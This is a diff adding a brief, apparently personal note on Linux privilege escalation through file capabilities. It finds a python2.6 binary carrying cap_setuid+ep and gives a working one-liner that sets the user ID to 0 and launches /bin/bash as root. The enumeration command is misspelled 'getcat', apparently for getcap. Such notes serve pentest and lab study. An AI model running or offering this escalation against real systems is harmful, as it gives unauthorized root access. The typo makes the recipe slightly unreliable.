@@ -1,0 +1,15 @@
+Privilege Escalation Using Capabilities
+========================================
+
+getcat -r / 2>/dev/null
+will get Only following.
+/usr/bin/python2.6 = cap_setuid+ep
+
+So, we will exploit python2.6 to escalate privilege
+
+Now:
+/usr/bin/python2.6 -c 'import os;os.setuid(0);os.system("/bin/bash");'
+
+get the root shell
+
+
